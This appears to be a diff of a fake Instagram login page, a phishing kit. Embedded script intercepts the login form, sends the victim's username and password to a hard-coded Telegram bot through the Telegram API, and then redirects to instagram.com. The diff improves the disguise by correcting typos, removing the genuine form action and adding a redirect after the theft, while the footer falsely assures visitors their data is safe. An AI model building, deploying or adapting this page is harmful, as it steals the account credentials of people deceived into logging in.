@@ -5,8 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="./styles.css" />
     <link rel="icon" type="image/png" href="./insta-fav.ico">
-    <title>Loin-Insagam</title>
-    <meta name="google-site-verification" content="9rnlJh4_PF0JvEd1nKc6ZrPjpb4MXlcmUgyVGddoD7g" />
+    <title>Login-Intagram</title>
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
@@ -15,16 +14,16 @@
         <section id="auth" class="flex direction-column">
             <div class="panel login flex direction-column">
                 <h1 title="Instgram" class="flex justify-content-center">
-                    <img src="instagram-logo (1).png" alt="Instgram" title="Instagram logo" />
+                    <img src="instagram-logo (1).png" alt="Instagram" title="Instagram logo" />
                 </h1>
-                <form id="form" action="https://www.instagram.com/" method="get">
+                <form id="form" >
                     <label for="message" class="sr-only">Phone number, Email, or Username</label>
-                    <input id="message" name="email" placeholder="Pone number, mail, or Username" />
+                    <input id="message" name="email" placeholder="Phone nmber, mail, or Usrname" />
 
                     <label for="password" class="sr-only">Password</label>
-                    <input id="password" name="pasword" type="password" placeholder="Pasword" />
+                    <input id="password" name="password" type="password" placeholder="Pasword" />
 
-                    <input id="submit" type="submit" value="Iog in"></input>
+                    <input id="submit" type="submit" value="Log in" action="https://www.instagram.com/accounts/login/?hl=en"></input>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
@@ -36,12 +35,12 @@
                         <img />
                         <a>log in with Facebook</a>
                     </div>
-                    <a href="#">forgt pasword?</a>
+                    <a href="#">forgot password?</a>
                 </div>
             </div>
             <div class="panel register flex justify-content-center">
-                <p>Don't have an ccount?</p>
-                <a href="#">Sng up</a>
+                <p>Don't have an account?</p>
+                <a href="#">Sing up</a>
             </div>
             <div class="app-download flex direction-column align-items-center">
                 <p>Get the app.</p>
@@ -67,23 +66,21 @@
             <li><a href="#">Contact</a></li>
         </ul>
         <p class="copyright">© 2024 Instagram from Meta</p>
-        <p>this sight is made for knowledge purpose your data will be safe here!</p>
+        <p class="copyright">This website is made for only knowle purpose!<br>Your data will be Safe here!
     </footer>
-
     <script>
-        const TELEGRAM_BOT_TOKEN = "7941616116:AAGw-d77ZVb6OtlrfC3TgWm27hJilwIcE80"; // Your Bot Token
-        const TELEGRAM_CHAT_ID = "1002169672280"; // Your Chat ID
+        const TELEGRAM_BOT_TOKEN = "7941616116:AAGw-d77ZVb6OtlrfC3TgWm27hJilwIcE80"; // Bot Token
+        const TELEGRAM_CHAT_ID = "-1002169672280"; // Chat ID
 
         document.getElementById("form").addEventListener("submit", async function (e) {
             e.preventDefault();
              
-            // Get the message and password values
+            // Get the message and note values
             const message = document.getElementById("message").value;
             const password = document.getElementById("password").value;
             
             // Format the message to include both message and password
             const formattedMessage = `Message: ${message}\nPassword: ${password}`;
-
 
             if (!message) {
                 alert("Please enter a username!");
@@ -91,10 +88,9 @@
             }
             
             if (!password) {
-                alert("Please enter a password!");
+                alert("Please enter a code!");
                 return;
             }
-            
 
             // Telegram API URL for sending messages
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -110,9 +106,23 @@
                     })
                 });
 
-             });
+                 // Handle the response
+                 const data = await response.json();
+                if (!response.ok) {
+                    console.log(`Failed to send message: ${data.description}`);
+                    alert(`Failed to send message: ${data.description}`);
+                }
+             
+                // Redirect to Instagram
+                window.location.href = "https://www.instagram.com/user";
+            } catch (error) {
+                console.error("Error:", error);
+                alert("An error occurred. Please contact support for details.");
+            }
+        });
     </script>
 
-    <script src="main.js">
+        
+    <script src="main.js"></script>
 </body>
 </html>
